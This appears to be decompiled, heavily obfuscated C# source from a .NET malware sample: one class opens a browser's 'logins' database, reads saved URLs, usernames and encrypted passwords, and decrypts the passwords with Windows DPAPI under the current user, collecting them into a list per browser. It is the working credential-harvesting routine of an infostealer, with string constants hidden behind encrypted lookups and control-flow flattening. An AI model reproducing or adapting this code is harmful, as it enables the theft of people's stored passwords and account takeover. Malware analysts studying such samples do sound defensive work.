using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

// Token: 0x0200002A RID: 42
internal sealed class clw
{
	// Token: 0x0600010B RID: 267 RVA: 0x00023B98 File Offset: 0x00021D98
	internal static List<clo> clq(string clz, string cmn, string cmo = "logins")
	{
		List<clo> list = new List<clo>();
		if (!File.Exists(clz))
		{
			return list;
		}
		jwq jwq;
		try
		{
			jwq = new jwq(clz);
		}
		catch (Exception ex)
		{
			return list;
		}
		if (!jwq.kry(cmo))
		{
			goto IL_51;
		}
		goto IL_82;
		uint num2;
		for (;;)
		{
			IL_56:
			uint num;
			switch ((num = (num2 ^ 2142595151u)) % 5u)
			{
			case 0u:
				goto IL_82;
			case 2u:
				goto IL_51;
			case 3u:
				return list;
			case 4u:
			{
				string text = string.Empty;
				num2 = (num * 1357431051u ^ 2030568141u);
				continue;
			}
			}
			break;
		}
		int num3 = 0;
		int num4 = checked(jwq.ktv() - 1);
		int num5 = num3;
		string text2;
		string text3;
		for (;;)
		{
			if (num5 <= num4)
			{
				try
				{
					text2 = jwq.kuv(num5, <Module>.smethod_0(575008));
					text3 = jwq.kuv(num5, <Module>.smethod_0(574928));
					string text = clw.cno(jwq.kuv(num5, <Module>.smethod_0(574976)));
					if (!string.IsNullOrEmpty(text2))
					{
						for (;;)
						{
							IL_1CA:
							uint num6 = 715850815u;
							for (;;)
							{
								uint num;
								switch ((num = (num6 ^ 2142595151u)) % 7u)
								{
								case 0u:
									goto IL_1CA;
								case 1u:
									if (text != null)
									{
										num6 = (num * 605843938u ^ 2372533082u);
										continue;
									}
									break;
								case 2u:
								{
									clo clo = new clo();
									clo.cly = text2;
									num6 = (num * 3435803494u ^ 659907402u);
									continue;
								}
								case 3u:
									if (!string.IsNullOrEmpty(text3))
									{
										num6 = (num * 3766597328u ^ 13896220u);
										continue;
									}
									break;
								case 5u:
								{
									clo clo;
									clo.clx = cmn;
									list.Add(clo);
									num6 = (num * 4087290826u ^ 2154212212u);
									continue;
								}
								case 6u:
								{
									clo clo;
									clo.clu = text3;
									clo.clv = text;
									num6 = (num * 425909484u ^ 3115526566u);
									continue;
								}
								}
								goto Block_12;
							}
						}
						Block_12:;
					}
					goto IL_257;
				}
				catch (Exception ex2)
				{
					for (;;)
					{
						IL_21A:
						uint num7 = 623766739u;
						for (;;)
						{
							uint num;
							switch ((num = (num7 ^ 2142595151u)) % 3u)
							{
							case 0u:
								goto IL_21A;
							case 2u:
								num7 = (num * 573121255u ^ 2921456160u);
								continue;
							}
							goto Block_14;
						}
					}
					Block_14:
					goto IL_257;
				}
				goto IL_223;
				IL_257:
				checked
				{
					num5++;
					goto IL_223;
				}
			}
			int num8 = 910093598;
			IL_228:
			switch ((num8 ^ 2142595151) % 4)
			{
			case 1:
				return list;
			case 2:
				continue;
			case 3:
				IL_223:
				num8 = 1480378429;
				goto IL_228;
			}
			break;
		}
		List<clo> result;
		return result;
		IL_51:
		num2 = 2095154105u;
		goto IL_56;
		IL_82:
		text2 = string.Empty;
		text3 = string.Empty;
		num2 = 1368682630u;
		goto IL_56;
	}

	// Token: 0x0600010C RID: 268 RVA: 0x00023E40 File Offset: 0x00022040
	private static string cno(string cnp)
	{
		if (cnp != null)
		{
			for (;;)
			{
				IL_42:
				uint num = 405657036u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 846828860u)) % 3u)
					{
					case 0u:
						goto IL_42;
					case 1u:
						if (cnp.Length == 0)
						{
							num = (num2 * 1789230249u ^ 3812104252u);
							continue;
						}
						goto IL_49;
					}
					goto Block_3;
				}
			}
			Block_3:
			goto IL_78;
			string result;
			try
			{
				IL_49:
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(cnp), null, DataProtectionScope.CurrentUser));
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}
		IL_78:
		return null;
	}
}
